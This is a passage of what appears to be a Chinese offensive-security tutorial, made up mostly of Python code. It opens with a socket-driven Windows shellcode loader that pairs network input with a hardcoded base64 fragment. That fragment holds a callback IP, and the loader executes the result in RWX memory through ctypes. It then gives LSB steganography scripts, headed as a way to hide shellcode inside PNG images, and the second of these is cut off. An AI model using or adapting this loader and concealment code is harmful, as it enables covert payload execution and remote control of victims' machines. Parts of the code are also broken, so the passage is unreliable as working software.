__author__ = <span class="hljs-string">&apos;xiaodi&apos;</span>

<span class="hljs-keyword">import</span> socket,base64,ctypes,os
server=socket.socket()


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">zx</span><span class="hljs-params">(data)</span>:</span>
    sc=base64.b64decode(data+<span class="hljs-string">b&apos;w4XAdeVYw+ip/f//NDcuOTQuMjM2LjExNwAAAYag&apos;</span>)
    print(sc)
    rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="hljs-number">0</span>, len(sc), <span class="hljs-number">0x1000</span>, <span class="hljs-number">0x40</span>)
    ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(sc), len(sc))
    handle = ctypes.windll.kernel32.CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, rwxpage, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)
    ctypes.windll.kernel32.WaitForSingleObject(handle, <span class="hljs-number">-1</span>)
    <span class="hljs-keyword">return</span> sc


server = socket.socket()
server.bind((<span class="hljs-string">&quot;0.0.0.0&quot;</span>,<span class="hljs-number">9999</span>))
server.listen(<span class="hljs-number">5</span>)
<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
    conn,addr = server.accept()
    print(<span class="hljs-string">&quot;new addr:&quot;</span>,addr)
    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
        data = conn.recv(<span class="hljs-number">1024</span>)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:
            print(<span class="hljs-string">&quot;&#x5BA2;&#x6237;&#x7AEF;&#x5DF2;&#x65AD;&#x5F00;&quot;</span>)
            <span class="hljs-keyword">break</span>
        print(<span class="hljs-string">&quot;&#x6267;&#x884C;&#x6307;&#x4EE4;&#xFF1A;&quot;</span>,data)
        zx(data)
        <span class="hljs-keyword">if</span> len(cmd_res) == <span class="hljs-number">0</span>:
            cmd_res = <span class="hljs-string">&quot;cmd has no output....&quot;</span>
        conn.send( str(len(cmd_res.encode())).encode() )  <span class="hljs-comment">#&#x53D1;&#x9001;&#x670D;&#x52A1;&#x7AEF;&#x53D1;&#x9001;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x6570;&#x636E;&#x7684;&#x957F;&#x5EA6;</span>
        conn.send(cmd_res.encode(<span class="hljs-string">&quot;utf-8&quot;</span>))   <span class="hljs-comment">#&#x53D1;&#x9001;&#x670D;&#x52A1;&#x7AEF;&#x7684;&#x6570;&#x636E;</span>
        print(<span class="hljs-string">&quot;send done&quot;</span>)
server.close()
</code></pre>
<h5 id="5&#x5C06;shellcode&#x9690;&#x5199;&#x8FDB;&#x5165;&#x56FE;&#x7247;&#x5185;">5)&#x5C06;shellcode&#x9690;&#x5199;&#x8FDB;&#x5165;&#x56FE;&#x7247;&#x5185;</h5>
<p>image-1.py</p>
<pre><code>python image-1.py -e 123.png xxxxx
</code></pre><pre><code>python image-1.py -d encodedImage.png
</code></pre><pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment">#coding=utf-8</span>

<span class="hljs-string">&quot;&quot;&quot;Encode png image via command-line.

Usage:
    imageEncoding (-e|encode) &lt;originImage&gt; [&lt;text&gt;] [&lt;encodedImage&gt;]
    imageEncoding (-d|decode) &lt;encodedImage&gt;

Options:
    -h,--help   &#x663E;&#x793A;&#x5E2E;&#x52A9;&#x83DC;&#x5355;
    -e          &#x52A0;&#x5BC6;
    -d          &#x89E3;&#x5BC6;

Example:
    imageEncoding -e coffee.png hello textOrFileToEncode encodedImage.png
    imageEncoding -d encodedImage.png
&quot;&quot;&quot;</span>

<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
<span class="hljs-keyword">from</span> docopt <span class="hljs-keyword">import</span> docopt


<span class="hljs-string">&quot;&quot;&quot;
&#x53D6;&#x5F97;&#x4E00;&#x4E2A; PIL &#x56FE;&#x50CF;&#x5E76;&#x4E14;&#x66F4;&#x6539;&#x6240;&#x6709;&#x503C;&#x4E3A;&#x5076;&#x6570;&#xFF08;&#x4F7F;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x4E3A; 0&#xFF09;
&quot;&quot;&quot;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RGBAmakeImageEven</span><span class="hljs-params">(image)</span>:</span>
    pixels = list(image.getdata())  <span class="hljs-comment"># &#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x8FD9;&#x6837;&#x7684;&#x5217;&#x8868;&#xFF1A; [(r,g,b,t),(r,g,b,t)...]</span>
    evenPixels = [(r&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>,g&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>,b&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>,t&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> [r,g,b,t] <span class="hljs-keyword">in</span> pixels]  <span class="hljs-comment"># &#x66F4;&#x6539;&#x6240;&#x6709;&#x503C;&#x4E3A;&#x5076;&#x6570;&#xFF08;&#x9B54;&#x6CD5;&#x822C;&#x7684;&#x79FB;&#x4F4D;&#xFF09;</span>
    evenImage = Image.new(image.mode, image.size)  <span class="hljs-comment"># &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x76F8;&#x540C;&#x5927;&#x5C0F;&#x7684;&#x56FE;&#x7247;&#x526F;&#x672C;</span>
    evenImage.putdata(evenPixels)  <span class="hljs-comment"># &#x628A;&#x4E0A;&#x9762;&#x7684;&#x50CF;&#x7D20;&#x653E;&#x5165;&#x5230;&#x56FE;&#x7247;&#x526F;&#x672C;</span>
    <span class="hljs-keyword">return</span> evenImage

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RGBmakeImageEven</span><span class="hljs-params">(image)</span>:</span>
    pixels = list(image.getdata())  <span class="hljs-comment"># &#x5F97;&#x5230;&#x4E00;&#x4E2A;&#x8FD9;&#x6837;&#x7684;&#x5217;&#x8868;&#xFF1A; [(r,g,b,t),(r,g,b,t)...]</span>
    evenPixels = [(r&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>,g&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>,b&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>) <span class="hljs-keyword">for</span> [r,g,b] <span class="hljs-keyword">in</span> pixels]  <span class="hljs-comment"># &#x66F4;&#x6539;&#x6240;&#x6709;&#x503C;&#x4E3A;&#x5076;&#x6570;&#xFF08;&#x9B54;&#x6CD5;&#x822C;&#x7684;&#x79FB;&#x4F4D;&#xFF09;</span>
    evenImage = Image.new(image.mode, image.size)  <span class="hljs-comment"># &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x76F8;&#x540C;&#x5927;&#x5C0F;&#x7684;&#x56FE;&#x7247;&#x526F;&#x672C;</span>
    evenImage.putdata(evenPixels)  <span class="hljs-comment"># &#x628A;&#x4E0A;&#x9762;&#x7684;&#x50CF;&#x7D20;&#x653E;&#x5165;&#x5230;&#x56FE;&#x7247;&#x526F;&#x672C;</span>
    <span class="hljs-keyword">return</span> evenImage

<span class="hljs-string">&quot;&quot;&quot;
&#x5185;&#x7F6E;&#x51FD;&#x6570; bin() &#x7684;&#x66FF;&#x4EE3;&#xFF0C;&#x8FD4;&#x56DE;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;
&quot;&quot;&quot;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">constLenBin</span><span class="hljs-params">(int)</span>:</span>
    binary = <span class="hljs-string">&quot;0&quot;</span>*(<span class="hljs-number">8</span>-(len(bin(int))<span class="hljs-number">-2</span>))+bin(int).replace(<span class="hljs-string">&apos;0b&apos;</span>,<span class="hljs-string">&apos;&apos;</span>)  <span class="hljs-comment"># &#x53BB;&#x6389; bin() &#x8FD4;&#x56DE;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x7684; &apos;0b&apos;&#xFF0C;&#x5E76;&#x5728;&#x5DE6;&#x8FB9;&#x8865;&#x8DB3; &apos;0&apos; &#x76F4;&#x5230;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;&#x4E3A; 8</span>
    <span class="hljs-keyword">return</span> binary

<span class="hljs-string">&quot;&quot;&quot;
&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x7F16;&#x7801;&#x5230;&#x56FE;&#x7247;&#x4E2D;
&quot;&quot;&quot;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RGBAencodeDataInImage</span><span class="hljs-params">(image, data)</span>:</span>
    evenImage = RGBAmakeImageEven(image)  <span class="hljs-comment"># &#x83B7;&#x5F97;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x4E3A; 0 &#x7684;&#x56FE;&#x7247;&#x526F;&#x672C;</span>
    binary = <span class="hljs-string">&apos;&apos;</span>.join(map(constLenBin,bytearray(data, <span class="hljs-string">&apos;utf-8&apos;</span>))) <span class="hljs-comment"># &#x5C06;&#x9700;&#x8981;&#x88AB;&#x9690;&#x85CF;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x6362;&#x6210;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;</span>
    <span class="hljs-keyword">if</span> len(binary) &gt; len(image.getdata()) * <span class="hljs-number">4</span>:  <span class="hljs-comment"># &#x5982;&#x679C;&#x4E0D;&#x53EF;&#x80FD;&#x7F16;&#x7801;&#x5168;&#x90E8;&#x6570;&#x636E;&#xFF0C; &#x629B;&#x51FA;&#x5F02;&#x5E38;</span>
        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Error: Can&apos;t encode more than &quot;</span> + len(evenImage.getdata()) * <span class="hljs-number">4</span> + <span class="hljs-string">&quot; bits in this image. &quot;</span>)
    encodedPixels = [(r+int(binary[index*<span class="hljs-number">4</span>+<span class="hljs-number">0</span>]),g+int(binary[index*<span class="hljs-number">4</span>+<span class="hljs-number">1</span>]),b+int(binary[index*<span class="hljs-number">4</span>+<span class="hljs-number">2</span>]),t+int(binary[index*<span class="hljs-number">4</span>+<span class="hljs-number">3</span>])) <span class="hljs-keyword">if</span> index*<span class="hljs-number">4</span> &lt; len(binary) <span class="hljs-keyword">else</span> (r,g,b,t) <span class="hljs-keyword">for</span> index,(r,g,b,t) <span class="hljs-keyword">in</span> enumerate(list(evenImage.getdata()))] <span class="hljs-comment"># &#x5C06; binary &#x4E2D;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x4FE1;&#x606F;&#x7F16;&#x7801;&#x8FDB;&#x50CF;&#x7D20;&#x91CC;</span>
    encodedImage = Image.new(evenImage.mode, evenImage.size)  <span class="hljs-comment"># &#x521B;&#x5EFA;&#x65B0;&#x56FE;&#x7247;&#x4EE5;&#x5B58;&#x653E;&#x7F16;&#x7801;&#x540E;&#x7684;&#x50CF;&#x7D20;</span>
    encodedImage.putdata(encodedPixels)  <span class="hljs-comment"># &#x6DFB;&#x52A0;&#x7F16;&#x7801;&#x540E;&#x7684;&#x6570;&#x636E;</span>
    <span class="hljs-keyword">return</span> encodedImage

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RGBencodeDataInImage</span><span class="hljs-params">(image, data)</span>:</span>
    evenImage = RGBmakeImageEven(image)  <span class="hljs-comment"># &#x83B7;&#x5F97;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x4E3A; 0 &#x7684;&#x56FE;&#x7247;&#x526F;&#x672C;</span>
    binary = <span class="hljs-string">&apos;&apos;</span>.join(map(constLenBin,bytearray(data, <span class="hljs-string">&apos;utf-8&apos;</span>))) <span class="hljs-comment"># &#x5C06;&#x9700;&#x8981;&#x88AB;&#x9690;&#x85CF;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x6362;&#x6210;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;</span>
    <span class="hljs-keyword">if</span> len(binary)%<span class="hljs-number">3</span> != <span class="hljs-number">0</span>:  <span class="hljs-comment"># &#x5C06;&#x8F6C;&#x6362;&#x7684;&#x6BD4;&#x7279;&#x6D41;&#x6570;&#x636E;&#x672B;&#x4F4D;&#x8865;&#x96F6;&#xFF0C;&#x4F7F;&#x5176;&#x957F;&#x5EA6;&#x4E3A;3&#x7684;&#x500D;&#x6570;&#xFF0C;&#x9632;&#x6B62;&#x5176;&#x5728;&#x4E0B;&#x9762;&#x91CD;&#x65B0;&#x7F16;&#x7801;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x53D1;&#x751F;&#x8D8A;&#x754C;</span>
        rema = len(binary)%<span class="hljs-number">3</span>
        binary = binary+(<span class="hljs-string">&apos;0&apos;</span>*(<span class="hljs-number">3</span>-rema))
<span class="hljs-comment">#        print(len(binary))</span>
    <span class="hljs-keyword">if</span> len(binary) &gt; len(image.getdata()) * <span class="hljs-number">3</span>:  <span class="hljs-comment"># &#x5982;&#x679C;&#x4E0D;&#x53EF;&#x80FD;&#x7F16;&#x7801;&#x5168;&#x90E8;&#x6570;&#x636E;&#xFF0C; &#x629B;&#x51FA;&#x5F02;&#x5E38;</span>
        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;Error: Can&apos;t encode more than &quot;</span> + len(evenImage.getdata()) * <span class="hljs-number">3</span> + <span class="hljs-string">&quot; bits in this image. &quot;</span>)
    <span class="hljs-comment"># evenImageList = list(evenImage.getdata())</span>

    <span class="hljs-comment"># for index in range(len(evenImageList)):</span>
    <span class="hljs-comment">#     if index*3 &lt; len(binary):</span>
    <span class="hljs-comment">#         tup = evenImageList[index]</span>
    <span class="hljs-comment">#         r = tup[0]</span>
    <span class="hljs-comment">#         g = tup[1]</span>
    <span class="hljs-comment">#         b = tup[2]</span>
    <span class="hljs-comment">#         r += int(binary[index*3+0])</span>
    <span class="hljs-comment">#         evenImageList[index] = (r,g,b)</span>
    <span class="hljs-comment">#     else:</span>
    <span class="hljs-comment">#         break</span>
    <span class="hljs-comment">#     if index*3+1 &lt; len(binary):</span>
    <span class="hljs-comment">#         tup = evenImageList[index]</span>
    <span class="hljs-comment">#         r = tup[0]</span>
    <span class="hljs-comment">#         g = tup[1]</span>
    <span class="hljs-comment">#         b = tup[2]</span>
    <span class="hljs-comment">#         g += int(binary[index*3+1])</span>
    <span class="hljs-comment">#         evenImageList[index] = (r,g,b)</span>
    <span class="hljs-comment">#     else:</span>
    <span class="hljs-comment">#         break</span>
    <span class="hljs-comment">#     if index*3+2 &lt; len(binary):</span>
    <span class="hljs-comment">#         tup = evenImageList[index]</span>
    <span class="hljs-comment">#         r = tup[0]</span>
    <span class="hljs-comment">#         g = tup[1]</span>
    <span class="hljs-comment">#         b = tup[2]</span>
    <span class="hljs-comment">#         b += int(binary[index*3+2])</span>
    <span class="hljs-comment">#         evenImageList[index] = (r,g,b)</span>
    <span class="hljs-comment">#     else:</span>
    <span class="hljs-comment">#         break</span>
    <span class="hljs-comment">#     index += 1</span>
    <span class="hljs-comment"># encodedPixels = evenImageList</span>
    encodedPixels = [(r+int(binary[index*<span class="hljs-number">3</span>+<span class="hljs-number">0</span>]),g+int(binary[index*<span class="hljs-number">3</span>+<span class="hljs-number">1</span>]),b+int(binary[index*<span class="hljs-number">3</span>+<span class="hljs-number">2</span>])) <span class="hljs-keyword">if</span> index*<span class="hljs-number">3</span> &lt; len(binary) <span class="hljs-keyword">else</span> (r,g,b) <span class="hljs-keyword">for</span> index, (r,g,b) <span class="hljs-keyword">in</span> enumerate(list(evenImage.getdata()))] <span class="hljs-comment"># &#x5C06; binary &#x4E2D;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x4FE1;&#x606F;&#x7F16;&#x7801;&#x8FDB;&#x50CF;&#x7D20;&#x91CC;</span>
    encodedImage = Image.new(evenImage.mode, evenImage.size)  <span class="hljs-comment"># &#x521B;&#x5EFA;&#x65B0;&#x56FE;&#x7247;&#x4EE5;&#x5B58;&#x653E;&#x7F16;&#x7801;&#x540E;&#x7684;&#x50CF;&#x7D20;</span>
    encodedImage.putdata(encodedPixels)  <span class="hljs-comment"># &#x6DFB;&#x52A0;&#x7F16;&#x7801;&#x540E;&#x7684;&#x6570;&#x636E;</span>
    <span class="hljs-keyword">return</span> encodedImage

<span class="hljs-string">&quot;&quot;&quot;
&#x4ECE;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;&#x8F6C;&#x4E3A; UTF-8 &#x5B57;&#x7B26;&#x4E32;
&quot;&quot;&quot;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">binaryToString</span><span class="hljs-params">(binary)</span>:</span>
    index = <span class="hljs-number">0</span>
    string = []
    rec = <span class="hljs-keyword">lambda</span> x, i: x[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>] + (rec(x[<span class="hljs-number">8</span>:], i<span class="hljs-number">-1</span>) <span class="hljs-keyword">if</span> i &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&apos;&apos;</span>) <span class="hljs-keyword">if</span> x <span class="hljs-keyword">else</span> <span class="hljs-string">&apos;&apos;</span>
    <span class="hljs-comment"># rec = lambda x, i: x and (x[2:8] + (i &gt; 1 and rec(x[8:], i-1) or &apos;&apos;)) or &apos;&apos;</span>
    fun = <span class="hljs-keyword">lambda</span> x, i: x[i+<span class="hljs-number">1</span>:<span class="hljs-number">8</span>] + rec(x[<span class="hljs-number">8</span>:], i<span class="hljs-number">-1</span>)
    <span class="hljs-keyword">while</span> index + <span class="hljs-number">1</span> &lt; len(binary):
        chartype = binary[index:].index(<span class="hljs-string">&apos;0&apos;</span>) <span class="hljs-comment"># &#x5B58;&#x653E;&#x5B57;&#x7B26;&#x6240;&#x5360;&#x5B57;&#x8282;&#x6570;&#xFF0C;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x7684;&#x5B57;&#x7B26;&#x4F1A;&#x5B58;&#x4E3A; 0</span>
        length = chartype*<span class="hljs-number">8</span> <span class="hljs-keyword">if</span> chartype <span class="hljs-keyword">else</span> <span class="hljs-number">8</span>
        string.append(chr(int(fun(binary[index:index+length],chartype),<span class="hljs-number">2</span>)))
        index += length
    <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;&apos;</span>.join(string)

<span class="hljs-string">&quot;&quot;&quot;
&#x89E3;&#x7801;&#x9690;&#x85CF;&#x6570;&#x636E;
&quot;&quot;&quot;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RGBAdecodeImage</span><span class="hljs-params">(image)</span>:</span>
    pixels = list(image.getdata())  <span class="hljs-comment"># &#x83B7;&#x5F97;&#x50CF;&#x7D20;&#x5217;&#x8868;</span>
    binary = <span class="hljs-string">&apos;&apos;</span>.join([str(int(r&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=r))+str(int(g&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=g))+str(int(b&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=b))+str(int(t&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=t)) <span class="hljs-keyword">for</span> (r,g,b,t) <span class="hljs-keyword">in</span> pixels]) <span class="hljs-comment"># &#x63D0;&#x53D6;&#x56FE;&#x7247;&#x4E2D;&#x6240;&#x6709;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x4E2D;&#x7684;&#x6570;&#x636E;</span>
    <span class="hljs-comment"># &#x627E;&#x5230;&#x6570;&#x636E;&#x622A;&#x6B62;&#x5904;&#x7684;&#x7D22;&#x5F15;</span>
    locationDoubleNull = binary.find(<span class="hljs-string">&apos;0000000000000000&apos;</span>)
    endIndex = locationDoubleNull+(<span class="hljs-number">8</span>-(locationDoubleNull % <span class="hljs-number">8</span>)) <span class="hljs-keyword">if</span> locationDoubleNull%<span class="hljs-number">8</span> != <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> locationDoubleNull
    data = binaryToString(binary[<span class="hljs-number">0</span>:endIndex])
    <span class="hljs-keyword">return</span> data

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RGBdecodeImage</span><span class="hljs-params">(image)</span>:</span>
    pixels = list(image.getdata())  <span class="hljs-comment"># &#x83B7;&#x5F97;&#x50CF;&#x7D20;&#x5217;&#x8868;</span>
    binary = <span class="hljs-string">&apos;&apos;</span>.join([str(int(r&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=r))+str(int(g&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=g))+str(int(b&gt;&gt;<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">1</span>!=b)) <span class="hljs-keyword">for</span> (r,g,b) <span class="hljs-keyword">in</span> pixels]) <span class="hljs-comment"># &#x63D0;&#x53D6;&#x56FE;&#x7247;&#x4E2D;&#x6240;&#x6709;&#x6700;&#x4F4E;&#x6709;&#x6548;&#x4F4D;&#x4E2D;&#x7684;&#x6570;&#x636E;</span>
    <span class="hljs-comment"># &#x627E;&#x5230;&#x6570;&#x636E;&#x622A;&#x6B62;&#x5904;&#x7684;&#x7D22;&#x5F15;</span>
    locationDoubleNull = binary.find(<span class="hljs-string">&apos;0000000000000000&apos;</span>)
    endIndex = locationDoubleNull+(<span class="hljs-number">8</span>-(locationDoubleNull % <span class="hljs-number">8</span>)) <span class="hljs-keyword">if</span> locationDoubleNull%<span class="hljs-number">8</span> != <span class="hljs-number">0</span> <span class="hljs-keyword">else</span> locationDoubleNull
    data = binaryToString(binary[<span class="hljs-number">0</span>:endIndex])
    <span class="hljs-keyword">return</span> data

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isTextFile</span><span class="hljs-params">(path)</span>:</span>
    <span class="hljs-keyword">if</span> path.endswith(<span class="hljs-string">&quot;.txt&quot;</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">elif</span> path.endswith(<span class="hljs-string">&quot;.m&quot;</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">elif</span> path.endswith(<span class="hljs-string">&quot;.h&quot;</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">elif</span> path.endswith(<span class="hljs-string">&quot;.c&quot;</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">elif</span> path.endswith(<span class="hljs-string">&quot;.py&quot;</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">False</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:
    <span class="hljs-string">&quot;&quot;&quot;command-line interface&quot;&quot;&quot;</span>
    arguments = docopt(__doc__)
<span class="hljs-comment">#    print(arguments)</span>

    <span class="hljs-keyword">if</span> arguments[<span class="hljs-string">&apos;-e&apos;</span>] <span class="hljs-keyword">or</span> arguments[<span class="hljs-string">&apos;encode&apos;</span>]:
        <span class="hljs-keyword">if</span> arguments[<span class="hljs-string">&apos;&lt;text&gt;&apos;</span>] <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:
            arguments[<span class="hljs-string">&apos;&lt;text&gt;&apos;</span>] = <span class="hljs-string">&quot;&#x5F85;&#x52A0;&#x5BC6;&#x7684;&#x6587;&#x672C;&quot;</span>
        <span class="hljs-keyword">if</span> arguments[<span class="hljs-string">&apos;&lt;encodedImage&gt;&apos;</span>] <span class="hljs-keyword">is</span> <span class="hljs-keyword">None</span>:
            arguments[<span class="hljs-string">&apos;&lt;encodedImage&gt;&apos;</span>] = <span class="hljs-string">&quot;encodedImage.png&quot;</span>

        <span class="hljs-keyword">if</span> isTextFile(arguments[<span class="hljs-string">&apos;&lt;text&gt;&apos;</span>]):
            <span class="hljs-keyword">with</span> open(arguments[<span class="hljs-string">&apos;&lt;text&gt;&apos;</span>], <span class="hljs-string">&apos;rt&apos;</span>) <span class="hljs-keyword">as</span> f:
                arguments[<span class="hljs-string">&apos;&lt;text&gt;&apos;</span>] = f.read()

        print(<span class="hljs-string">&quot;&#x8F7D;&#x4F53;&#x56FE;&#x7247;:&quot;</span>)
        print(arguments[<span class="hljs-string">&apos;&lt;originImage&gt;&apos;</span>]+<span class="hljs-string">&quot;\n&quot;</span>)
        print(<span class="hljs-string">&quot;&#x5F85;&#x52A0;&#x5BC6;&#x5BC6;&#x6587;:&quot;</span>)
        print(arguments[<span class="hljs-string">&apos;&lt;text&gt;&apos;</span>]+<span class="hljs-string">&quot;\n&quot;</span>)
        print(<span class="hljs-string">&quot;&#x52A0;&#x5BC6;&#x540E;&#x56FE;&#x7247;:&quot;</span>)
        print(arguments[<span class="hljs-string">&apos;&lt;encodedImage&gt;&apos;</span>]+<span class="hljs-string">&quot;\n&quot;</span>)
        print(<span class="hljs-string">&quot;&#x52A0;&#x5BC6;&#x4E2D;&#x2026;&#x2026;\n&quot;</span>)
        im = Image.open(arguments[<span class="hljs-string">&apos;&lt;originImage&gt;&apos;</span>])
        <span class="hljs-keyword">if</span> im.mode == <span class="hljs-string">&apos;RGBA&apos;</span>:
            RGBAencodeDataInImage(im, arguments[<span class="hljs-string">&apos;&lt;text&gt;&apos;</span>]).save(arguments[<span class="hljs-string">&apos;&lt;encodedImage&gt;&apos;</span>])
        <span class="hljs-comment"># elif im.mode == &apos;RGB&apos;:</span>
        <span class="hljs-comment">#     RGBencodeDataInImage(im, arguments[&apos;&lt;text&gt;&apos;]).save(arguments[&apos;&lt;encodedImage&gt;&apos;])</span>
        <span class="hljs-keyword">else</span>:
            print(<span class="hljs-string">&quot;&#x6682;&#x4E0D;&#x652F;&#x6301;&#x6B64;&#x56FE;&#x7247;&#x683C;&#x5F0F;&#x2026;&#x2026;&quot;</span>)

        print(<span class="hljs-string">&quot;&#x52A0;&#x5BC6;&#x5B8C;&#x6210;,&#x5BC6;&#x6587;&#x4E3A;&#xFF1A;\n&quot;</span>+arguments[<span class="hljs-string">&apos;&lt;text&gt;&apos;</span>]+<span class="hljs-string">&quot;\n&quot;</span>)
    <span class="hljs-keyword">elif</span> arguments[<span class="hljs-string">&apos;-d&apos;</span>] <span class="hljs-keyword">or</span> arguments[<span class="hljs-string">&apos;decode&apos;</span>]:
        print(<span class="hljs-string">&quot;&#x89E3;&#x5BC6;&#x4E2D;&#x2026;&#x2026;\n&quot;</span>)
        im = Image.open(arguments[<span class="hljs-string">&apos;encodedImage.png&apos;</span>])
        <span class="hljs-keyword">if</span> im.mode == <span class="hljs-string">&apos;RGBA&apos;</span>:
            print(<span class="hljs-string">&quot;&#x89E3;&#x79D8;&#x5B8C;&#x6210;&#xFF0C;&#x5BC6;&#x6587;&#x4E3A;&#xFF1A;\n&quot;</span>+RGBAdecodeImage(im)+<span class="hljs-string">&quot;\n&quot;</span>)


        <span class="hljs-comment"># elif im.mode == &apos;RGB&apos;:</span>
        <span class="hljs-comment">#     print(&quot;&#x89E3;&#x79D8;&#x5B8C;&#x6210;&#xFF0C;&#x5BC6;&#x6587;&#x4E3A;&#xFF1A;\n&quot;+RGBdecodeImage(im)+&quot;\n&quot;)</span>
        <span class="hljs-keyword">else</span>:
            print(<span class="hljs-string">&quot;&#x975E;&#x6CD5;&#x7684;&#x56FE;&#x7247;&#x683C;&#x5F0F;&#x2026;&#x2026;&quot;</span>)
</code></pre>
<p>image-2.py</p>
<pre><code class="lang-python"><span class="hljs-comment">#!/usr/bin/env python3</span>
<span class="hljs-comment">#coding=utf-8</span>

<span class="hljs-string">&quot;&quot;&quot;Encode png image via command-line.

Usage:
    imageEncoding (-e|encode) &lt;originImage&gt; [&lt;text&gt;] [&lt;encodedImage&gt;]
    imageEncoding (-d|decode) &lt;encodedImage&gt;

Options:
    -h,--help   &#x663E;&#x793A;&#x5E2E;&#x52A9;&#x83DC;&#x5355;
    -e          &#x52A0;&#x5BC6;
    -d          &#x89E3;&#x5BC6;

Example:
    imageEncoding -e coffee.png hello textOrFileToEncode encodedImage.png
    imageEncoding -d encodedImage.png
&quot;&quot;&quot;</span>

<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
<span class="hljs-keyword">from</span> docopt <span class="hljs-keyword">import</span> docopt
<span class="hljs-keyword">import</span> base64,ctypes



<span class="hljs-string">&quot;&quot;&quot;
&#x5185;&#x7F6E;&#x51FD;&#x6570; bin() &#x7684;&#x66FF;&#x4EE3;&#xFF0C;&#x8FD4;&#x56DE;&#x56FA;&#x5B9A;&#x957F;&#x5EA6;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x5B57;&#x7B26;&#x4E32;
&quot;&quot;&quot;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">constLenBin</span><span class="hljs-params">(int)</span>:</span>
